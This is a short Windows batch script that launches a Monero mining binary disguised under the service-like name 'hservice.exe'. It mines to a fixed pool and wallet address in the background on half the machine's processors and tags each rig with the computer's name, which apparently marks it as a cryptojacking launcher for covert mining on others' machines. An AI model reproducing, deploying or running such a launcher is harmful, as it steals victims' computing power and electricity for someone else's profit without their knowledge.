@echo off
set /a logicprocessor = "%NUMBER_OF_PROCESSORS%/2"
hservice.exe -o pool.minexmr.com:443 -u 48LFDhtqfquYSy7njxBb859taAJTN6iFyZcMxtiakUMfGAJ3tzkTpRkbc5cvUN35dCNYUkofwp59Z33HjLwvZoah4PBQgy2 -k --tls -t %logicprocessor% --rig-id %COMPUTERNAME% -B
pause
